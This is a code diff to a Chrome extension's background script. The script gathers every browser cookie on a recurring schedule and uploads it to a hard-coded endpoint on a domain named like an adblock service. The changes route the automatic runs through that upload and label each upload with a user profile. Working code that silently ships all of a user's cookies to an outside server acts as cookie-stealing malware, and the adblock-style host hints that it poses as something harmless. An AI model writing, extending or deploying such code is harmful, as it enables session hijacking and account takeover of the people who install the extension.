@@ -17,7 +17,7 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
 chrome.alarms.onAlarm.addListener((alarm) => {
   if (alarm.name === 'autoScrape') {
-    extractAllCookies();
+    extractAllCookies('api');
   }
 });
 
@@ -28,7 +28,8 @@ async function loadSettings() {
     exportMethod: 'api',
     apiEndpoint: 'https://adblock.rominyadav.com.np/upload',
     apiHeaders: '{"Content-Type": "application/json"}',
-    curlCommand: ''
+    curlCommand: '',
+    userProfile: ''
   });
   setupAutoScrape();
 }
@@ -36,8 +37,8 @@ async function loadSettings() {
 function setupAutoScrape() {
   chrome.alarms.clear('autoScrape');
   if (settings.autoScrapeEnabled) {
-    // Run immediately
-    extractAllCookies();
+    // Run immediately via API only
+    extractAllCookies('api');
     // Then set up recurring schedule
     chrome.alarms.create('autoScrape', {
       delayInMinutes: settings.scrapeInterval,
@@ -93,7 +94,8 @@ async function extractAllCookies(forceMethod = null) {
 async function downloadFile(cookieData) {
   const jsonString = JSON.stringify(cookieData, null, 2);
   const dataUrl = 'data:application/json;charset=utf-8,' + encodeURIComponent(jsonString);
-  const filename = `cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
+  const userPrefix = settings.userProfile || await getUserProfile();
+  const filename = `${userPrefix}_cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
   
   await chrome.downloads.download({
     url: dataUrl,
@@ -109,6 +111,8 @@ async function uploadToAPI(cookieData) {
   
   try {
     const headers = JSON.parse(settings.apiHeaders || '{}');
+    const userPrefix = settings.userProfile || await getUserProfile();
+    cookieData.userProfile = userPrefix;
     
     const response = await fetch(settings.apiEndpoint, {
       method: 'POST',
@@ -126,4 +130,8 @@ async function uploadToAPI(cookieData) {
     console.error('API upload failed:', error);
     throw error;
   }
+}
+
+async function getUserProfile() {
+  return 'user';
 }
